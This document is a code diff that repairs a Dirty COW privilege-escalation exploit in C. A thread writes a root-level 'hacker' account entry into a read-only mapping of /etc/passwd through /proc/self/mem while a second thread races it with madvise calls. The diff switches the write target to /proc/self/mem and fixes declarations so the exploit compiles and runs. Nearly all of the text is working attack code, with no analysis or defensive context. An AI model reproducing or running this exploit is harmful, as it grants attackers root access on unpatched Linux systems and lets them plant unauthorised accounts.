@@ -1,22 +1,25 @@
-#include <sys/mman.h>
+﻿#include <sys/mman.h>
 #include <fcntl.h>
 #include <pthread.h>
 #include <sys/stat.h>
 #include <string.h>
 
+void *map;
+
+
 void * writeThread(void *arg)
 {
-char *content ="﻿hacker:x:0000"
+char *content ="﻿hacker:x:0000";
 off_t offset = (off_t) arg;
 
-int f=open("/etc/passwd",O_RDWR);
+int f=open("/proc/self/mem",O_RDWR);
 while (1)
 {
 // Move the file pointer to the corresponding position
-lseek(f,offset,SEEK_SET);
+lseek(f, offset, SEEK_SET);
 
 // Write to memory
-write(f,content,strlen(content));    
+write(f, content, strlen(content));    
     
 } // end while 
 } // end writeThread 
@@ -27,13 +30,11 @@ void *madviseThread (void * arg)
     int file_size = (int) arg;
     while (1)
     {
-    madvise (map,file_size, MADV_DONTNEED);    
+    madvise (map, file_size, MADV_DONTNEED);    
     } // end while 
     
 } // end madviseThread
 
-
-void *map;
 int main (int argc, char *argv[])
 {
 pthread_t pth1,pth2; 
@@ -61,3 +62,5 @@ pthread_join (pth2,NULL);
 
 return 0;
 } // end main
+
+
